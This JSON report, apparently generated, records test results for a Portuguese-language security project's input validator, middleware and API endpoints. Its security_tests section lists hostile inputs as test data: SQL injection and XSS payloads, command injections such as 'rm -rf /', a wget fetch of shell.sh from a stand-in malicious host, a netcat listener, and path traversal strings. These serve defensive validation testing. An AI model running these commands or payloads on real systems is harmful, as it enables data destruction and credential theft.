{
  "timestamp": "2025-08-03T11:06:54.019588",
  "system_components": {
    "Input Validator": {
      "status": "‚úÖ FUNCIONANDO",
      "description": "Sistema de valida√ß√£o de entrada corrigido e operacional",
      "tests_passed": 29,
      "tests_total": 30,
      "success_rate": 96.7
    },
    "Security Middleware": {
      "status": "‚úÖ FUNCIONANDO",
      "description": "Middleware de seguran√ßa ativo e detectando amea√ßas",
      "features": [
        "Rate Limiting",
        "IP Blocking",
        "Request Validation"
      ]
    },
    "Logging System": {
      "status": "‚úÖ FUNCIONANDO",
      "description": "Sistema de logs inicializado e registrando eventos",
      "log_directory": "C:\\Users\\dev\\Documents\\Atous-Sec-Network\\logs"
    },
    "API Server": {
      "status": "‚ö†Ô∏è PROBLEMAS DE CONFIGURA√á√ÉO",
      "description": "Servidor com problemas de importa√ß√£o, mas componentes core funcionais",
      "issues": [
        "ImportError: ValidationResult",
        "Configura√ß√£o ABISS incompleta"
      ]
    },
    "ML Components": {
      "status": "‚ö†Ô∏è CONFIGURA√á√ÉO PENDENTE",
      "description": "Componentes ML importados mas precisam de configura√ß√£o adicional",
      "components": [
        "ABISS",
        "NNIS",
        "LoRa"
      ]
    }
  },
  "security_tests": {
    "timestamp": "2025-08-03T10:54:48.086622",
    "total_tests": 30,
    "passed_tests": 29,
    "failed_tests": 1,
    "categories": {
      "sql_injection": [
        {
          "test": "SELECT * FROM users WHERE id = '1' OR '1'='1'",
          "blocked": true,
          "threats": [
            "sql_injection"
          ]
        },
        {
          "test": "'; DROP TABLE users; --",
          "blocked": true,
          "threats": [
            "sql_injection",
            "command_injection"
          ]
        },
        {
          "test": "1' UNION SELECT username, password FROM users--",
          "blocked": true,
          "threats": [
            "sql_injection"
          ]
        },
        {
          "test": "admin'--",
          "blocked": true,
          "threats": [
            "sql_injection"
          ]
        },
        {
          "test": "' OR 1=1#",
          "blocked": true,
          "threats": [
            "sql_injection"
          ]
        }
      ],
      "xss": [
        {
          "test": "<script>alert('xss')</script>",
          "blocked": true,
          "threats": [
            "sql_injection",
            "xss",
            "command_injection"
          ]
        },
        {
          "test": "<img src=x onerror=alert('xss')>",
          "blocked": true,
          "threats": [
            "sql_injection",
            "xss",
            "command_injection"
          ]
        },
        {
          "test": "javascript:alert('xss')",
          "blocked": true,
          "threats": [
            "sql_injection",
            "xss",
            "command_injection"
          ]
        },
        {
          "test": "<iframe src='javascript:alert(1)'></iframe>",
          "blocked": true,
          "threats": [
            "sql_injection",
            "xss",
            "command_injection"
          ]
        },
        {
          "test": "<svg onload=alert('xss')></svg>",
          "blocked": true,
          "threats": [
            "sql_injection",
            "xss",
            "command_injection"
          ]
        }
      ],
      "command_injection": [
        {
          "test": "ls -la; rm -rf /",
          "blocked": true,
          "threats": [
            "sql_injection",
            "command_injection"
          ]
        },
        {
          "test": "cat /etc/passwd",
          "blocked": true,
          "threats": [
            "command_injection"
          ]
        },
        {
          "test": "wget http://malicious.com/shell.sh",
          "blocked": true,
          "threats": [
            "command_injection"
          ]
        },
        {
          "test": "nc -l 4444",
          "blocked": true,
          "threats": [
            "command_injection"
          ]
        },
        {
          "test": "ping google.com && rm file.txt",
          "blocked": true,
          "threats": [
            "sql_injection",
            "command_injection"
          ]
        }
      ],
      "path_traversal": [
        {
          "test": "../../../etc/passwd",
          "blocked": true,
          "threats": [
            "path_traversal"
          ]
        },
        {
          "test": "..\\..\\..\\windows\\system32\\config\\sam",
          "blocked": true,
          "threats": [
            "path_traversal"
          ]
        },
        {
          "test": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
          "blocked": true,
          "threats": [
            "path_traversal"
          ]
        },
        {
          "test": "....//....//....//etc/passwd",
          "blocked": true,
          "threats": [
            "path_traversal"
          ]
        },
        {
          "test": "..%252f..%252f..%252fetc%252fpasswd",
          "blocked": false,
          "threats": []
        }
      ],
      "email_validation": [
        {
          "email": "user@example.com",
          "expected": true,
          "result": true,
          "correct": true
        },
        {
          "email": "test.email+tag@domain.co.uk",
          "expected": true,
          "result": true,
          "correct": true
        },
        {
          "email": "invalid-email",
          "expected": false,
          "result": false,
          "correct": true
        },
        {
          "email": "@domain.com",
          "expected": false,
          "result": false,
          "correct": true
        },
        {
          "email": "user@",
          "expected": false,
          "result": false,
          "correct": true
        }
      ],
      "url_validation": [
        {
          "url": "https://example.com",
          "expected": true,
          "result": true,
          "correct": true
        },
        {
          "url": "http://subdomain.domain.com/path",
          "expected": true,
          "result": true,
          "correct": true
        },
        {
          "url": "not-a-url",
          "expected": false,
          "result": false,
          "correct": true
        },
        {
          "url": "ftp://files.example.com",
          "expected": true,
          "result": true,
          "correct": true
        },
        {
          "url": "javascript:alert('xss')",
          "expected": false,
          "result": false,
          "correct": true
        }
      ]
    }
  },
  "api_tests": {
    "test_type": "API Endpoints Test",
    "timestamp": "2025-08-03T10:56:04.445191",
    "summary": {
      "total_endpoints": 4,
      "successful_endpoints": 0,
      "failed_endpoints": 4,
      "success_rate": 0.0
    },
    "results": [
      {
        "endpoint": "Health Check",
        "url": "http://localhost:8000/health",
        "status_code": 0,
        "response_time": 0,
        "success": false,
        "error": "Connection refused",
        "timestamp": "2025-08-03T10:55:52.201949"
      },
      {
        "endpoint": "Security Status",
        "url": "http://localhost:8000/api/security/status",
        "status_code": 0,
        "response_time": 0,
        "success": false,
        "error": "Connection refused",
        "timestamp": "2025-08-03T10:55:56.253206"
      },
      {
        "endpoint": "Root Endpoint",
        "url": "http://localhost:8000/",
        "status_code": 0,
        "response_time": 0,
        "success": false,
        "error": "Connection refused",
        "timestamp": "2025-08-03T10:56:00.398479"
      },
      {
        "endpoint": "Docs",
        "url": "http://localhost:8000/docs",
        "status_code": 0,
        "response_time": 0,
        "success": false,
        "error": "Connection refused",
        "timestamp": "2025-08-03T10:56:04.445191"
      }
    ]
  },
  "vulnerabilities": [
    {
      "type": "Syntax Error - Unterminated String",
      "file": "input_validator.py",
      "status": "‚úÖ CORRIGIDO",
      "description": "String extremamente longa e malformada removida"
    },
    {
      "type": "Import Error - ValidationResult",
      "file": "security.py",
      "status": "‚ö†Ô∏è IDENTIFICADO",
      "description": "Classe ValidationResult n√£o encontrada no m√≥dulo"
    },
    {
      "type": "Configuration Error - ABISS",
      "file": "main.py",
      "status": "‚ö†Ô∏è IDENTIFICADO",
      "description": "Sistema ABISS requer configura√ß√£o adicional"
    }
  ],
  "recommendations": [
    "‚úÖ Sistema de valida√ß√£o de entrada est√° funcionando corretamente",
    "‚úÖ Padr√µes de detec√ß√£o de amea√ßas implementados e testados",
    "‚úÖ Sistema de logging operacional e registrando eventos",
    "‚ö†Ô∏è Corrigir problemas de importa√ß√£o no m√≥dulo de API",
    "‚ö†Ô∏è Completar configura√ß√£o dos componentes ML (ABISS, NNIS)",
    "‚ö†Ô∏è Implementar testes de integra√ß√£o para componentes ML",
    "üí° Considerar implementar monitoramento em tempo real",
    "üí° Adicionar alertas autom√°ticos para detec√ß√£o de amea√ßas",
    "üí° Implementar backup autom√°tico dos logs de seguran√ßa"
  ],
  "scores": {
    "security_score": 0,
    "component_score": 60.0,
    "api_score": 0.0,
    "overall_score": 18.0,
    "status": "üî¥ CR√çTICO"
  },
  "next_steps": [
    "1. Corrigir problemas de importa√ß√£o no m√≥dulo de API",
    "2. Completar configura√ß√£o dos sistemas ML",
    "3. Implementar testes de integra√ß√£o completos",
    "4. Configurar monitoramento em tempo real",
    "5. Implementar sistema de alertas autom√°ticos"
  ]
}